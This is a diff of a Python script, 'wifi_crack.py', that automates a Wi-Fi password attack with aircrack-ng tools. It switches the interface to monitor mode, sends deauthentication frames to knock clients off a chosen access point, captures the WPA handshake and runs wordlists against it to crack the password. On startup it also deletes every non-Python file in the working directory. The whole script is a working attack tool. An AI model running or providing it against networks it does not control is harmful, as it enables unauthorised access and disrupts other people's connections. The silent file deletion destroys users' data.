@@ -1,21 +1,27 @@
-#  sudo python3 wifi_crack.py                                    
-
-
+#  sudo python3 wifi_crack.py   
 
 import os
 import time
+import subprocess
 
 interface = "wlan0"
 fileName = "new"
-wordlist = "/home/sohail/Documents/archive/my.txt"
+pwd = os.getcwd()
+
+wordlists = sorted([file for file in os.listdir(pwd + "/wordlist") if file.endswith('.txt')])
+
 
 def start_monitor_mode(interface):
     print(f"Starting monitor mode on {interface}")
     os.system(f"sudo airmon-ng start {interface}")
     time.sleep(3)
 
-def check_points():
-    os.system(f"airodump-ng {interface}mon")
+def stop_monitor_mode(interface):
+    print(f"Stopping monitor mode on {interface}")
+    os.system(f"sudo airmon-ng stop {interface}mon")
+
+def check_points(interface):
+    os.system(f"sudo airodump-ng {interface}mon")
 
 def capture_handshake(interface, bssid, channel):
     print(f"Capturing handshake for BSSID: {bssid} on channel {channel}")
@@ -23,33 +29,41 @@ def capture_handshake(interface, bssid, channel):
     time.sleep(10)
 
 def deauth_attack(interface, bssid):
-    
-    print("                                      past on new terminal")
-    print("                                      ")
-    print("                                      ")
-    print(f" sudo aireplay-ng --deauth 30 -a {bssid} -c S wlan0mon")
-    print("                                      ")
-    input("copy^^^^^^^^^^^^^^^^^^^^^^^^and enter")
-def crack_password():
-    os.system(f"sudo aircrack-ng -w {wordlist} {fileName}-01.cap")
+    print(f"Launching deauth attack on BSSID: {bssid}")
+    subprocess.Popen(f"sudo aireplay-ng --deauth 30 -a {bssid} {interface}mon", shell=True)
 
+def crack_password(wordlist):
+    print(f"\n \n \n **********************APPLYING {wordlist}\n \n \n ")
+    os.system(f"sudo aircrack-ng -w {pwd+"/wordlist/"+wordlist} {fileName}-01.cap")
 
+def delete_non_py_files(directory):
+    # Loop through all files in the directory
+    for filename in os.listdir(directory):
+        file_path = os.path.join(directory, filename)
+        # Check if it's a file and not a .py file
+        if os.path.isfile(file_path) and not filename.endswith('.py') and filename != "wordlist":
+            try:
+                os.remove(file_path)  # Delete the file
+                print(f"Deleted: {filename}")
+            except Exception as e:
+                print(f"Failed to delete {filename}: {e}")
 
-if __name__ == "__main__":
-
+def catch_packet(interface):
     start_monitor_mode(interface)
-    check_points()
-
-    target_bssid = input("Enter bssid")
-    target_channel = input("Enter channel ")
-    print(f"{target_bssid} ")
-    print(f"{target_channel} ")
-    
+    check_points(interface)
+    target_bssid = input("Enter BSSID: ")
+    target_channel = input("Enter channel: ")
     deauth_attack(interface, target_bssid)
     capture_handshake(interface, target_bssid, target_channel)
-  
-    crack_password()
 
-    input("\n \n \n \n \n enter hit enter")
+def apply_wordlists():
+    for fileName in wordlists:
+        crack_password(fileName)
 
-    os.system(f"airmon-ng stop {interface}mon")
+    input("\n \n \n \n \n Press enter to stop monitor mode.")
+    stop_monitor_mode(interface)
+
+if __name__ == "__main__":
+    delete_non_py_files(pwd)
+    catch_packet(interface)
+    apply_wordlists()
